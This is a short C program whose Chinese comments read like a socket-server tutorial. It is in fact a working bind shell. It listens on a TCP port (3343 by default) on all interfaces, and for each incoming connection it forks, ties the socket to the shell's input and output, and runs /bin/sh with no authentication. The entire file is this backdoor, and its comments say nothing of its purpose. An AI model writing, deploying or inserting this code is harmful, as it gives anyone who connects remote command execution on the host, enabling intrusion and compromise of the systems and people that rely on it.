#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>


int main(int argc, char* argv[]) {
    int socket_fd, connect_fd;
    struct sockaddr_in servaddr;
    int n;
    //初始化Socket
    if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("create socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }
    //初始化
    int port = 3343;
    if(argc>=2){
        port = atoi(argv[1]);
    }
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);//IP地址设置成INADDR_ANY,让系统自动获取本机的IP地址。
    servaddr.sin_port = htons(port);//设置的端口为DEFAULT_PORT

    //将本地地址绑定到所创建的套接字上
    if (bind(socket_fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) == -1) {
        printf("bind socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }
    //开始监听是否有客户端连接
    if (listen(socket_fd, 10) == -1) {
        printf("listen socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }

    while (1) {
        //阻塞直到有客户端连接，不然多浪费CPU资源。
        if ((connect_fd = accept(socket_fd, (struct sockaddr *) NULL, NULL)) == -1) {
            printf("accept socket error: %s(errno: %d)", strerror(errno), errno);
            exit(0);
        }
        char *argv[2] = {"sh", NULL};
        int pid = fork();
        if(pid == -1) {
            exit(0);
        }
        if (!pid) {
            dup2(connect_fd, 0);
            dup2(connect_fd, 1);
            dup2(connect_fd, 2);
            execve("/bin/sh", argv, __environ);
            exit(0);
        }
        close(connect_fd);
    }
    close(socket_fd);
}
